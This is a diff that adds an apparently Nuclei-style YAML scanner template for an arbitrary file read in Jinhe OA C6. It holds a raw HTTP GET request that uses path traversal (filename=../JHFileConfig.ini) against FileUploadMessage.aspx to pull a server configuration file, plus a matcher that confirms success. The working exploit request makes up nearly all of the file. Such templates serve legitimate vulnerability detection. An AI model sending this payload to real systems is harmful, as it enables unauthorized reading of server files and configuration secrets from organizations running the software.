@@ -1,0 +1,25 @@
+id: jinhe-c6-FileUploadMessage-fileread
+
+info:
+  name: 金和OA-C6-任意文件读取-FileUploadMessage
+  author: HuanXiong
+  severity: medium
+  description: |-
+    
+  reference:
+    - 
+  tags: File Reading
+
+http:
+  - raw:
+      - |
+        GET /C6/JHSoft.WCF/FunctionNew/FileUploadMessage.aspx?filename=../JHFileConfig.ini HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
+
+    matchers:
+      - type: dsl
+        name: 任意文件读取
+        dsl:
+          - "status_code==200 && contains_all(body,'[JHFile]')"
+
